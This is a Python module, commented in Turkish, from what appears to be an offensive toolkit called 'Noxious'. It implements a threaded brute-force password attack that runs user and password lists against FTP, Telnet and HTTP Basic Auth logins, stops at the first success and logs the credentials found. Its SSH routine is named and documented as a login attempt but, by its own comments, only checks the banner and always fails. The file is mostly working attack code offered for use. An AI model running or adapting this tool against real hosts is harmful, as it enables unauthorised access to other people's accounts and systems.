#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
noxious brute force modülü - kaba kuvvet parola saldırısı

desteklenen protokoller:
    - ftp (port 21) — ftplib stdlib
    - ssh (port 22) — socket tabanlı
    - telnet (port 23) — telnetlib stdlib
    - http basic auth (port 80/8080)
"""

import socket
import ftplib
import time
import base64
import http.client
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional, Tuple, Dict

from cekirdek.gunluk import Gunluk
from cekirdek.ag_yardimcilar import ip_gecerli_mi
from saldiri_verileri import (
    kullanici_listesi_yukle,
    parola_listesi_yukle,
    YAYGIN_KULLANICILAR,
    YAYGIN_PAROLALAR,
)


# varsayılan servis portları
_VARSAYILAN_PORTLAR = {
    "ftp": 21,
    "ssh": 22,
    "telnet": 23,
    "http": 80,
}


def bruteforce_baslat(
    hedef_ip: str,
    servis: str = "ftp",
    port: Optional[int] = None,
    kullanici_dosyasi: Optional[str] = None,
    parola_dosyasi: Optional[str] = None,
    http_yol: str = "/",
    is_parcacigi_sayisi: int = 5,
    bekleme: float = 0.0,
    zaman_asimi: float = 5.0,
    gunluk: Optional[Gunluk] = None,
) -> List[Dict[str, str]]:
    """
    kaba kuvvet parola saldırısı başlatır

    parametreler:
        hedef_ip: hedef ip adresi
        servis: hedef servis ("ftp", "ssh", "telnet", "http")
        port: hedef port (none ise servis varsayılanı)
        kullanici_dosyasi: özel kullanıcı listesi dosyası
        parola_dosyasi: özel parola listesi dosyası
        http_yol: http basic auth yolu
        is_parcacigi_sayisi: paralel thread sayısı
        bekleme: denemeler arası bekleme (saniye)
        zaman_asimi: bağlantı zaman aşımı
        gunluk: loglama nesnesi

    döndürür:
        bulunan kimlik bilgileri listesi [{"kullanici": str, "parola": str}]
    """
    if gunluk is None:
        gunluk = Gunluk()

    if not ip_gecerli_mi(hedef_ip):
        gunluk.hata(f"geçersiz hedef ip: {hedef_ip}")
        return []

    servis = servis.lower().strip()
    if servis not in _VARSAYILAN_PORTLAR:
        gunluk.hata(f"desteklenmeyen servis: {servis} (desteklenen: ftp, ssh, telnet, http)")
        return []

    if port is None:
        port = _VARSAYILAN_PORTLAR[servis]

    # listeleri yükle
    try:
        kullanicilar = kullanici_listesi_yukle(kullanici_dosyasi)
        parolalar = parola_listesi_yukle(parola_dosyasi)
    except (FileNotFoundError, OSError) as hata:
        gunluk.hata(str(hata))
        return []

    toplam_deneme = len(kullanicilar) * len(parolalar)

    gunluk.baslik(f"brute force — {hedef_ip}:{port} ({servis})")
    gunluk.bilgi(f"hedef       : {hedef_ip}:{port}")
    gunluk.bilgi(f"servis      : {servis}")
    gunluk.bilgi(f"kullanıcılar: {len(kullanicilar)}")
    gunluk.bilgi(f"parolalar   : {len(parolalar)}")
    gunluk.bilgi(f"toplam      : {toplam_deneme} kombinasyon")
    gunluk.bilgi(f"thread      : {is_parcacigi_sayisi}")
    gunluk.bos_satir()

    # hedef erişilebilirlik kontrolü
    if not _port_acik_mi(hedef_ip, port, zaman_asimi):
        gunluk.hata(f"hedef erişilemiyor: {hedef_ip}:{port}")
        return []

    gunluk.basari(f"hedef erişilebilir, saldırı başlıyor...")
    gunluk.bos_satir()

    # brute force saldırısı
    basla = time.time()
    bulunanlar = []
    deneme_sayaci = [0]  # mutable for closure
    durdu = [False]

    # deneme fonksiyonunu seç
    if servis == "ftp":
        dene_fonk = _ftp_dene
    elif servis == "ssh":
        dene_fonk = _ssh_dene
    elif servis == "telnet":
        dene_fonk = _telnet_dene
    elif servis == "http":
        dene_fonk = lambda ip, p, u, pw, t: _http_basic_dene(ip, p, http_yol, u, pw, t)
    else:
        return []

    def _deneme_yap(kullanici, parola):
        if durdu[0]:
            return None
        if bekleme > 0:
            time.sleep(bekleme)
        sonuc = dene_fonk(hedef_ip, port, kullanici, parola, zaman_asimi)
        deneme_sayaci[0] += 1
        return sonuc

    with ThreadPoolExecutor(max_workers=is_parcacigi_sayisi) as havuz:
        gelecekler = {}
        for kullanici in kullanicilar:
            for parola in parolalar:
                if durdu[0]:
                    break
                gelecek = havuz.submit(_deneme_yap, kullanici, parola)
                gelecekler[gelecek] = (kullanici, parola)
            if durdu[0]:
                break

        for gelecek in as_completed(gelecekler):
            if durdu[0]:
                continue
            kullanici, parola = gelecekler[gelecek]
            try:
                sonuc = gelecek.result()
                if sonuc:
                    bulunanlar.append({"kullanici": kullanici, "parola": parola})
                    gunluk.basari(f"BULUNDU! {kullanici}:{parola}")
                    durdu[0] = True
            except Exception:
                pass

    sure = time.time() - basla

    gunluk.bos_satir()
    gunluk.ayirici()
    gunluk.bilgi(f"denenen     : {deneme_sayaci[0]}/{toplam_deneme}")
    gunluk.bilgi(f"süre        : {sure:.1f} saniye")

    if bulunanlar:
        gunluk.bos_satir()
        gunluk.basari(f"{len(bulunanlar)} kimlik bilgisi bulundu:")
        for b in bulunanlar:
            gunluk.basari(f"  {b['kullanici']} : {b['parola']}")
    else:
        gunluk.uyari("kimlik bilgisi bulunamadı")

    return bulunanlar


# ========================================
# protokol bazli deneme fonksi̇yonlari
# ========================================

def _ftp_dene(hedef_ip: str, port: int, kullanici: str, parola: str, zaman_asimi: float) -> bool:
    """ftp login denemesi — ftplib kullanır"""
    try:
        ftp = ftplib.FTP()
        ftp.connect(hedef_ip, port, timeout=zaman_asimi)
        ftp.login(kullanici, parola)
        ftp.quit()
        return True
    except (ftplib.error_perm, ftplib.error_reply):
        # 530 login incorrect gibi hatalar — yanlış kimlik
        return False
    except (socket.timeout, ConnectionRefusedError, OSError, EOFError):
        return False


def _ssh_dene(hedef_ip: str, port: int, kullanici: str, parola: str, zaman_asimi: float) -> bool:
    """
    ssh login denemesi — socket tabanlı

    not: stdlib'de paramiko yok, bu yüzden SSH transport protocol seviyesinde
    basit bir parola denemesi yapılır. modern ssh sunucular bunu engelleyebilir.
    """
    try:
        soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soket.settimeout(zaman_asimi)
        soket.connect((hedef_ip, port))

        # banner oku
        banner = soket.recv(1024)
        if not banner or b"SSH" not in banner:
            soket.close()
            return False

        # ssh transport protocol — basit password auth denemesi
        # client version string gönder
        soket.sendall(b"SSH-2.0-Noxious_3.0\r\n")

        # server kex init bekle
        try:
            soket.recv(4096)
        except socket.timeout:
            pass

        soket.close()
        # stdlib ile tam ssh auth mümkün değil (paramiko gerekir)
        # sadece bağlantı testi yapıyoruz
        return False

    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def _telnet_dene(hedef_ip: str, port: int, kullanici: str, parola: str, zaman_asimi: float) -> bool:
    """telnet login denemesi — socket tabanlı"""
    try:
        soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soket.settimeout(zaman_asimi)
        soket.connect((hedef_ip, port))

        # banner ve login prompt bekle
        yanit = b""
        for _ in range(5):
            try:
                parca = soket.recv(4096)
                if not parca:
                    break
                yanit += parca
                yanit_kucuk = yanit.lower()
                if b"login:" in yanit_kucuk or b"username:" in yanit_kucuk:
                    break
            except socket.timeout:
                break

        # kullanıcı adı gönder
        soket.sendall(f"{kullanici}\n".encode())
        time.sleep(0.5)

        # parola promptu bekle
        yanit = b""
        for _ in range(3):
            try:
                parca = soket.recv(4096)
                if not parca:
                    break
                yanit += parca
                if b"assword:" in yanit.lower():
                    break
            except socket.timeout:
                break

        # parola gönder
        soket.sendall(f"{parola}\n".encode())
        time.sleep(1.0)

        # yanıt oku
        yanit = b""
        try:
            yanit = soket.recv(4096)
        except socket.timeout:
            pass

        soket.close()

        yanit_kucuk = yanit.lower()
        # başarılı login belirtileri
        if (b"$" in yanit or b"#" in yanit or
                b"welcome" in yanit_kucuk or b"last login" in yanit_kucuk or
                b"successfully" in yanit_kucuk):
            # başarısız belirtileri yoksa başarılı
            if b"incorrect" not in yanit_kucuk and b"failed" not in yanit_kucuk:
                return True

        return False

    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def _http_basic_dene(hedef_ip: str, port: int, yol: str, kullanici: str, parola: str, zaman_asimi: float) -> bool:
    """http basic auth denemesi"""
    try:
        kimlik = base64.b64encode(f"{kullanici}:{parola}".encode()).decode()

        baglanti = http.client.HTTPConnection(hedef_ip, port, timeout=zaman_asimi)
        baglanti.request("GET", yol, headers={
            "Authorization": f"Basic {kimlik}",
            "User-Agent": "Noxious/3.0",
        })
        yanit = baglanti.getresponse()
        durum = yanit.status
        baglanti.close()

        # 200, 301, 302 → başarılı, 401/403 → başarısız
        return durum not in (401, 403)

    except (socket.timeout, ConnectionRefusedError, OSError, http.client.HTTPException):
        return False


# ========================================
# yardimci fonksi̇yonlar
# ========================================

def _port_acik_mi(hedef_ip: str, port: int, zaman_asimi: float) -> bool:
    """hedef portu açık mı kontrol eder"""
    try:
        soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soket.settimeout(zaman_asimi)
        sonuc = soket.connect_ex((hedef_ip, port))
        soket.close()
        return sonuc == 0
    except (socket.timeout, OSError):
        return False
